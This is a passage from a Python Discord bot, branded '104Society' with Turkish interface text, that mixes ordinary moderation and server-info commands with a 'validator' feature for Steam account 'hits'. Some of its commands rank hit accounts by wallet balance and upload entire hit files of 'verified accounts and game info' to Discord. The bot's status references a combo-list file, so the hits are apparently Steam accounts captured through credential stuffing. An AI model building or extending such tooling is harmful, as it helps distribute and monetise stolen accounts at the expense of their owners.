    await ctx.send(embed=embed)


@bot.hybrid_command(name="withwallet", description="Steam bakiyesi olan hit hesaplarını listeler")
@app_commands.describe(amount="Kaç sonuç (varsayılan: 10, max: 20)")
async def cmd_withwallet(ctx: commands.Context, amount: int = 10):
    await ctx.defer()

    amount   = min(max(1, amount), 20)
    all_hits = await asyncio.get_event_loop().run_in_executor(None, read_all_hits)
    filtered = [
        h for h in all_hits
        if h["wallet"] and h["wallet"] not in ("0.00 TL", "0.00", "")
    ]
    # Sort by wallet amount if parseable
    def wallet_val(w: str) -> float:
        try:
            return float(re.sub(r"[^\d.]", "", w))
        except Exception:
            return 0.0
    filtered.sort(key=lambda h: -wallet_val(h["wallet"]))
    filtered = filtered[:amount]

    if not filtered:
        await ctx.send("❌ Bakiyeli hesap bulunamadı.")
        return

    embed = discord.Embed(
        title=f"💰 Bakiyeli Hesaplar — {len(filtered)} Sonuç",
        color=COLOR_GREEN,
        timestamp=datetime.now(timezone.utc)
    )
    for i, hit in enumerate(filtered, 1):
        name, value = _format_hit_embed_field(hit, i)
        embed.add_field(name=name, value=value, inline=False)
        if i >= 25:
            break

    embed.set_footer(text="104Society Wallet Filter", icon_url=STEAM_ICON)
    await ctx.send(embed=embed)


@bot.hybrid_command(name="downloadhits", description="Hit kütüğü dosyasını (.txt) doğrudan Discord'dan indirmenizi sağlar")
@app_commands.describe(file_type="İndirilecek dosya türü: hitsdc (Discord formatı), targets (Sadece Target oyunlar), all (Tüm ücretli hitler)")
@app_commands.choices(file_type=[
    app_commands.Choice(name="hitsdc.txt (Tüm doğrulanmış Discord hitleri)", value="hitsdc"),
    app_commands.Choice(name="hits.txt (Özel Target Oyunlu Hesaplar)", value="targets"),
    app_commands.Choice(name="hits_all_paid.txt (Tüm Ücretli Oyunlu Hesaplar)", value="all"),
])
async def cmd_downloadhits(ctx: commands.Context, file_type: str = "hitsdc"):
    await ctx.defer()
    
    target_path = HITSDC_FILE
    if file_type == "targets":
        target_path = HITS_TARGET_FILE
    elif file_type == "all":
        target_path = HITS_ALL_FILE

    if not target_path.exists() or target_path.stat().st_size == 0:
        # Fallback to hitsdc if specific file is empty
        if HITSDC_FILE.exists() and HITSDC_FILE.stat().st_size > 0:
            target_path = HITSDC_FILE
        else:
            await ctx.send("❌ İndirilebilecek hit dosyası henüz bulunamadı.")
            return

    try:
        count = count_lines(target_path)
        file_size_kb = round(target_path.stat().st_size / 1024, 1)
        discord_file = discord.File(str(target_path), filename=target_path.name)
        
        embed = discord.Embed(
            title=f"📥 Hit Dosyası Hazır: `{target_path.name}`",
            description=f"✅ Toplam **{count:,}** adet doğrulanmış hesap ve oyun bilgisi ektedir.",
            color=COLOR_GREEN,
            timestamp=datetime.now(timezone.utc)
        )
        embed.add_field(name="Boyut", value=f"`{file_size_kb} KB`", inline=True)
        embed.add_field(name="Kayıt Sayısı", value=f"`{count:,}` hesap", inline=True)
        embed.set_footer(text="104Society Hit Exporter", icon_url=STEAM_ICON)
        
        await ctx.send(embed=embed, file=discord_file)
    except Exception as e:
        await ctx.send(f"❌ Dosya gönderilirken hata oluştu: `{e}`")


@bot.hybrid_command(name="steamgame", description="Steam Mağazasında oyun fiyatı ve bilgisi arar")
@app_commands.describe(query="Aranacak oyun ismi")
async def cmd_steamgame(ctx: commands.Context, query: str):
    await ctx.defer()

    encoded = urllib.parse.quote(query)
    url = f"https://store.steampowered.com/api/storesearch/?term={encoded}&l=turkish&cc=TR"

    try:
        req = urllib.request.Request(url, headers={"User-Agent": "104Society-Steam-Bot"})
        with urllib.request.urlopen(req, timeout=8) as resp:
            data  = json.loads(resp.read().decode("utf-8"))
            items = data.get("items", [])
            if not items:
                await ctx.send(f"❌ Steam mağazasında `{query}` bulunamadı.")
                return

            game       = items[0]
            appid      = game.get("id")
            name       = game.get("name")
            price_info = game.get("price")

            price_str = "Ücretsiz / F2P"
            if price_info:
                init_p = price_info.get("initial", 0) / 100
                fin_p  = price_info.get("final", 0) / 100
                curr   = price_info.get("currency", "USD")
                disc   = price_info.get("discount_percent", 0)
                if disc > 0:
                    price_str = f"~~{init_p:.2f} {curr}~~ ➜ **{fin_p:.2f} {curr}** (%{disc} İndirim!)"
                else:
                    price_str = f"**{fin_p:.2f} {curr}**"

            embed = discord.Embed(
                title=f"🎮 {name}",
                url=f"https://store.steampowered.com/app/{appid}/",
                color=COLOR_GREEN,
                timestamp=datetime.now(timezone.utc)
            )
            embed.add_field(name="AppID", value=f"`{appid}`", inline=True)
            embed.add_field(name="Fiyat", value=price_str, inline=True)
            embed.set_image(url=f"https://cdn.akamai.steamstatic.com/steam/apps/{appid}/header.jpg")
            embed.set_footer(text="Steam Store API", icon_url=STEAM_ICON)
            await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"❌ Steam sorgusu başarısız oldu: `{e}`")


# ────────────────────────────────────────────────────────────────────────────
# 2. MODERATION & SERVER MANAGEMENT COMMANDS
# ────────────────────────────────────────────────────────────────────────────

@bot.hybrid_command(name="ban", description="Kullanıcıyı sunucudan yasaklar")
@app_commands.describe(member="Yasaklanacak kullanıcı", reason="Yasaklama sebebi")
@commands.has_permissions(ban_members=True)
async def cmd_ban(ctx: commands.Context, member: discord.Member, reason: str = "104Society Moderasyon"):
    await ctx.defer()
    try:
        await member.ban(reason=reason)
        embed = discord.Embed(title="🔨 Kullanıcı Yasaklandı", color=COLOR_RED, timestamp=datetime.now(timezone.utc))
        embed.add_field(name="Kullanıcı", value=f"{member} (`{member.id}`)", inline=True)
        embed.add_field(name="Yetkili",   value=str(ctx.author), inline=True)
        embed.add_field(name="Sebep",     value=reason, inline=False)
        await ctx.send(embed=embed)
    except discord.Forbidden:
        await ctx.send("❌ Bu kullanıcıyı yasaklamak için yetkim yetersiz.")


@bot.hybrid_command(name="unban", description="Yasaklı kullanıcının yasağını kaldırır")
@app_commands.describe(user_id="Kullanıcı ID numarası")
@commands.has_permissions(ban_members=True)
async def cmd_unban(ctx: commands.Context, user_id: str):
    await ctx.defer()
    try:
        uid  = int(user_id)
        user = await bot.fetch_user(uid)
        await ctx.guild.unban(user)
        embed = discord.Embed(title="✅ Yasak Kaldırıldı", color=COLOR_GREEN, timestamp=datetime.now(timezone.utc))
        embed.add_field(name="Kullanıcı", value=f"{user} (`{uid}`)", inline=True)
        embed.add_field(name="Yetkili",   value=str(ctx.author), inline=True)
        await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"❌ Yasak kaldırılamadı: `{e}`")


@bot.hybrid_command(name="kick", description="Kullanıcıyı sunucudan atar")
@app_commands.describe(member="Atılacak kullanıcı", reason="Sebep")
@commands.has_permissions(kick_members=True)
async def cmd_kick(ctx: commands.Context, member: discord.Member, reason: str = "104Society Moderasyon"):
    await ctx.defer()
    try:
        await member.kick(reason=reason)
        embed = discord.Embed(title="👢 Kullanıcı Atıldı", color=COLOR_ORANGE, timestamp=datetime.now(timezone.utc))
        embed.add_field(name="Kullanıcı", value=f"{member} (`{member.id}`)", inline=True)
        embed.add_field(name="Yetkili",   value=str(ctx.author), inline=True)
        embed.add_field(name="Sebep",     value=reason, inline=False)
        await ctx.send(embed=embed)
    except discord.Forbidden:
        await ctx.send("❌ Bu kullanıcıyı atmak için yetkim yetersiz.")


@bot.hybrid_command(name="timeout", description="Kullanıcıya geçici susturma (timeout) uygular")
@app_commands.describe(member="Susturulacak kullanıcı", minutes="Süre (dakika)", reason="Sebep")
@commands.has_permissions(moderate_members=True)
async def cmd_timeout(ctx: commands.Context, member: discord.Member, minutes: int = 10, reason: str = "Belirtilmedi"):
    await ctx.defer()
    try:
        await member.timeout(timedelta(minutes=minutes), reason=reason)
        embed = discord.Embed(title="⏳ Kullanıcı Susturuldu", color=COLOR_ORANGE, timestamp=datetime.now(timezone.utc))
        embed.add_field(name="Kullanıcı", value=f"{member.mention}", inline=True)
        embed.add_field(name="Süre",      value=f"**{minutes}** dakika", inline=True)
        embed.add_field(name="Sebep",     value=reason, inline=False)
        await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"❌ Susturma uygulanamadı: `{e}`")


@bot.hybrid_command(name="clear", description="Belirtilen sayıda mesajı siler")
@app_commands.describe(amount="Silinecek mesaj sayısı (1-100)")
@commands.has_permissions(manage_messages=True)
async def cmd_clear(ctx: commands.Context, amount: int = 10):
    await ctx.defer(ephemeral=True)
    amount  = min(max(1, amount), 100)
    deleted = await ctx.channel.purge(limit=amount)
    await ctx.send(f"✅ **{len(deleted)}** adet mesaj temizlendi.", ephemeral=True)


@bot.hybrid_command(name="lock", description="Kanalı mesaj yazmaya kilitler")
@commands.has_permissions(manage_channels=True)
async def cmd_lock(ctx: commands.Context):
    await ctx.defer()
    overwrite = ctx.channel.overwrites_for(ctx.guild.default_role)
    overwrite.send_messages = False
    await ctx.channel.set_permissions(ctx.guild.default_role, overwrite=overwrite)
    await ctx.send("🔒 Bu kanal mesaj gönderimine **kilitlendi**.")


@bot.hybrid_command(name="unlock", description="Kanal kilidini açar")
@commands.has_permissions(manage_channels=True)
async def cmd_unlock(ctx: commands.Context):
    await ctx.defer()
    overwrite = ctx.channel.overwrites_for(ctx.guild.default_role)
    overwrite.send_messages = True
    await ctx.channel.set_permissions(ctx.guild.default_role, overwrite=overwrite)
    await ctx.send("🔓 Bu kanal mesaj gönderimine **açıldı**.")


# ────────────────────────────────────────────────────────────────────────────
# 3. UTILITY & SERVER INFORMATION COMMANDS
# ────────────────────────────────────────────────────────────────────────────

@bot.hybrid_command(name="serverinfo", description="Sunucu hakkında detaylı analiz")
async def cmd_serverinfo(ctx: commands.Context):
    await ctx.defer()
    g = ctx.guild
    if not g:
        await ctx.send("Bu komut yalnızca sunucularda çalışır.")
        return
    embed = discord.Embed(title=f"🏠 {g.name}", color=BOT_COLOR, timestamp=datetime.now(timezone.utc))
    embed.add_field(name="🆔 Sunucu ID",      value=str(g.id), inline=True)
    embed.add_field(name="👑 Kurucu",          value=str(g.owner), inline=True)
    embed.add_field(name="👥 Toplam Üye",      value=f"{g.member_count:,}", inline=True)
    embed.add_field(name="💬 Metin Kanalları", value=str(len(g.text_channels)), inline=True)
    embed.add_field(name="🔊 Ses Kanalları",   value=str(len(g.voice_channels)), inline=True)
    embed.add_field(name="🎭 Rol Sayısı",      value=str(len(g.roles)), inline=True)
    embed.add_field(name="🚀 Boost Seviyesi",  value=f"Seviye {g.premium_tier} ({g.premium_subscription_count} Boost)", inline=True)
    embed.add_field(name="📅 Kuruluş Tarihi",  value=g.created_at.strftime("%Y-%m-%d"), inline=True)
    if g.icon:
        embed.set_thumbnail(url=g.icon.url)
    embed.set_footer(text="104Society Server Telemetry", icon_url=STEAM_ICON)
    await ctx.send(embed=embed)


@bot.hybrid_command(name="userinfo", description="Kullanıcı profili ve rolleri")
@app_commands.describe(member="Bilgisi istenecek kullanıcı")
async def cmd_userinfo(ctx: commands.Context, member: Optional[discord.Member] = None):
    await ctx.defer()
    m = member or ctx.author
    embed = discord.Embed(
        title=f"👤 {m.display_name}",
        color=m.color if hasattr(m, "color") else BOT_COLOR,
        timestamp=datetime.now(timezone.utc)
    )
    embed.add_field(name="Kullanıcı Adı",    value=str(m), inline=True)
    embed.add_field(name="ID",               value=str(m.id), inline=True)
    embed.add_field(name="Bot?",             value="Evet" if m.bot else "Hayır", inline=True)
    if hasattr(m, "joined_at") and m.joined_at:
        embed.add_field(name="Sunucuya Katılma", value=m.joined_at.strftime("%Y-%m-%d %H:%M"), inline=True)
    embed.add_field(name="Hesap Oluşturulma", value=m.created_at.strftime("%Y-%m-%d %H:%M"), inline=True)
    roles = [r.mention for r in m.roles[1:]][:12]
    embed.add_field(name=f"Roller ({len(m.roles)-1})", value=" ".join(roles) or "Rol yok", inline=False)
    if m.avatar:
        embed.set_thumbnail(url=m.avatar.url)
    embed.set_footer(text="104Society User Telemetry", icon_url=STEAM_ICON)
    await ctx.send(embed=embed)


@bot.hybrid_command(name="avatar", description="Kullanıcının profil fotoğrafını büyük boyutta gösterir")
@app_commands.describe(member="Hedef kullanıcı")
async def cmd_avatar(ctx: commands.Context, member: Optional[discord.Member] = None):
    await ctx.defer()
    m   = member or ctx.author
    url = m.avatar.url if m.avatar else m.default_avatar.url
    embed = discord.Embed(title=f"🖼️ {m.display_name} Avatarı", color=BOT_COLOR)
    embed.set_image(url=url)
    await ctx.send(embed=embed)


@bot.hybrid_command(name="invite", description="104Society botunun sunucu davet linkini verir")
async def cmd_invite(ctx: commands.Context):
    await ctx.defer()
    invite_url = f"https://discord.com/api/oauth2/authorize?client_id={APPLICATION_ID}&permissions=8&scope=bot%20applications.commands"
    embed = discord.Embed(
        title="🤖 104Society Bot Davet Linki",
        description=f"[Sunucuna Eklemek İçin Buraya Tıkla]({invite_url})\n\n**Gerekli İzinler:** Yönetici (Administrator), Slash Komutları",
        color=BOT_COLOR
    )
    embed.set_thumbnail(url=STEAM_ICON)
    await ctx.send(embed=embed)


@bot.hybrid_command(name="ping", description="Bot gecikme süresi (latency)")
async def cmd_ping(ctx: commands.Context):
    ms    = round(bot.latency * 1000)
    color = COLOR_GREEN if ms < 80 else (COLOR_ORANGE if ms < 180 else COLOR_RED)
    await ctx.send(embed=discord.Embed(
        title="🏓 Pong!",
        description=f"Gecikme: **{ms}ms**",
        color=color
    ))


@bot.hybrid_command(name="help", description="Tüm 104Society bot komutlarını listeler")
async def cmd_help(ctx: commands.Context):
    await ctx.defer()
    embed = discord.Embed(
        title="🤖 104Society Bot — Komut Kılavuzu",
        description="Tüm komutlar hem Slash (`/`) hem de Prefix (`!`) ile çalışır:",
        color=BOT_COLOR,
        timestamp=datetime.now(timezone.utc)
    )
    embed.add_field(
        name="📊 Validator & Analiz",
        value=(
            "`/stats` — Canlı doğrulama sayıları & franchise analizi\n"
            "`/cloud` — GitLab CI/CD 24/7 canlı durumu\n"
            "`/recenthits [count]` — Son düşen geçerli hesaplar (max 20)\n"
            "`/hitsummary` — Franchise/kategori dağılım özeti\n"
            "`/highvalue [min_games] [amount]` — En çok oyunlu hesaplar\n"
            "`/vacbanned [amount]` — VAC banlı hesaplar\n"
            "`/withwallet [amount]` — Steam bakiyeli hesaplar"
        ),
        inline=False
    )
    embed.add_field(
        name="🔍 Arama & Seriler",
        value=(
            "`/search <seri/oyun> [amount]` — Seri/oyun adıyla arama (fuzzy)\n"
            "`/serieslist` — Desteklenen 100+ seri anahtarları\n"
            "`/steamgame <oyun>` — Steam mağaza fiyatı ve detayı"
        ),
        inline=False
    )
    embed.add_field(
        name="🛡️ Moderasyon",
        value=(
            "`/ban <üye> [sebep]` — Yasaklar\n"
            "`/unban <id>` — Yasak kaldırır\n"
            "`/kick <üye> [sebep]` — Atar\n"
            "`/timeout <üye> <dk>` — Susturur\n"
            "`/clear <adet>` — Toplu mesaj siler\n"
            "`/lock` / `/unlock` — Kanalı kilitler/açar"
        ),
        inline=False
    )
    embed.add_field(
        name="⚙️ Genel & Bilgi",
        value=(
            "`/serverinfo` — Sunucu analizleri\n"
            "`/userinfo [üye]` — Üye profili\n"
            "`/avatar [üye]` — Profil fotoğrafı\n"
            "`/invite` — Bot davet linki\n"
            "`/ping` — Gecikme süresi"
        ),
        inline=False
    )
    embed.set_thumbnail(url=STEAM_ICON)
    embed.set_footer(text="104Society Platform Management", icon_url=STEAM_ICON)
    await ctx.send(embed=embed)


# ── Error Handler ────────────────────────────────────────────────────────────
@bot.event
async def on_command_error(ctx: commands.Context, error):
    if isinstance(error, commands.MissingPermissions):
        await ctx.send("❌ Bu komutu kullanmak için yetkiniz yok.", ephemeral=True)
    elif isinstance(error, commands.MemberNotFound):
        await ctx.send("❌ Kullanıcı bulunamadı.", ephemeral=True)
    elif isinstance(error, commands.CommandNotFound):
        pass  # Silently ignore unknown prefix commands
    else:
        # Log unexpected errors
        print(f"[Bot Error] {type(error).__name__}: {error}")


@bot.tree.error
async def on_app_command_error(interaction: discord.Interaction, error: app_commands.AppCommandError):
    msg = f"❌ Komut hatası: `{error}`"
    if isinstance(error, app_commands.MissingPermissions):
        msg = "❌ Bu komutu kullanmak için yetkiniz yok."
    try:
        if interaction.response.is_done():
            await interaction.followup.send(msg, ephemeral=True)
        else:
            await interaction.response.send_message(msg, ephemeral=True)
    except Exception:
        pass


# ── Lifecycle Hooks ──────────────────────────────────────────────────────────
@bot.event
async def on_ready():
    try:
        synced = await bot.tree.sync()
        print(f"\n[104Society Bot] Giriş yapıldı: {bot.user} (ID: {bot.user.id})")
        print(f"[104Society Bot] {len(synced)} Slash komutu senkronize edildi.")
    except Exception as e:
        print(f"[104Society Bot] Slash sync notice: {e}")

    await bot.change_presence(
        status=discord.Status.online,
        activity=discord.Activity(
            type=discord.ActivityType.watching,
            name="1_combined.txt | /help | /stats"
        )
    )
    print("[104Society Bot] Bot durumu: Online | Göreve hazır.\n")


# ── Entrypoint ───────────────────────────────────────────────────────────────
if __name__ == "__main__":
    if not BOT_TOKEN:
        print("=" * 65)
        print(" [104Society Bot] BOT_TOKEN bulunamadı!")
        print("=" * 65)
        print(" Discord Developer Portal -> Bot -> 'Reset Token' / 'Copy Token'")
        print(" Token'ı .env dosyasına ekleyin veya komut satırında verin:")
        print("   set BOT_TOKEN=token_buraya")
        print("   python bot_104society.py")
        print("=" * 65)
        sys.exit(0)

    bot.run(BOT_TOKEN)
